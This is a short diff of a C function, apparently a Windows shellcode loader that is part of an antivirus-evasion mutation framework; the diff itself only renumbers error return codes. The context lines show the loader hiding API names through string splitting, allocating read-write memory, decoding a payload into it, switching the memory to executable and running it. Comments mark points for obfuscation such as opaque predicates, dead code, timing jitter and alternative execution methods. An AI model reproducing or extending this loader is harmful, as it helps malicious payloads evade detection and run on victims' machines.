@@ -153,7 +153,7 @@ int carrier() {
 
     LPVOID k32 = get_module_by_name(kernel32);
     // @MUTATE:opaque_predicate
-    if (!k32) return 1;
+    if (!k32) return 32;
 
     // @MUTATE:string_splitting
     char val_str[] = { 'V','i','r','t','u','a','l','A','l','l','o','c', 0 };
@@ -164,11 +164,11 @@ int carrier() {
 
     // @MUTATE:dead_code_insertion
     // @MUTATE:opaque_predicate
-    if (!myVirtualAlloc || !myVirtualProtect) return 2;
+    if (!myVirtualAlloc || !myVirtualProtect) return 33;
 
     // @MUTATE:literal_encoding
     char *dest = (char*)myVirtualAlloc(NULL, PAYLOAD_LEN, 0x3000, p_RW);
-    if (!dest) return 3;
+    if (!dest) return 30;
 
     // @MUTATE:timing_jitter
     decode_payload(dest, PAYLOAD_LEN);
@@ -176,7 +176,7 @@ int carrier() {
 
     // @MUTATE:staged_rx
     DWORD old;
-    if (!myVirtualProtect(dest, PAYLOAD_LEN, p_RX, &old)) return 4;
+    if (!myVirtualProtect(dest, PAYLOAD_LEN, p_RX, &old)) return 31;
     // @MUTATE:timing_jitter
 
     // @MUTATE:execution_method(direct|callback|fiber|threadpool)
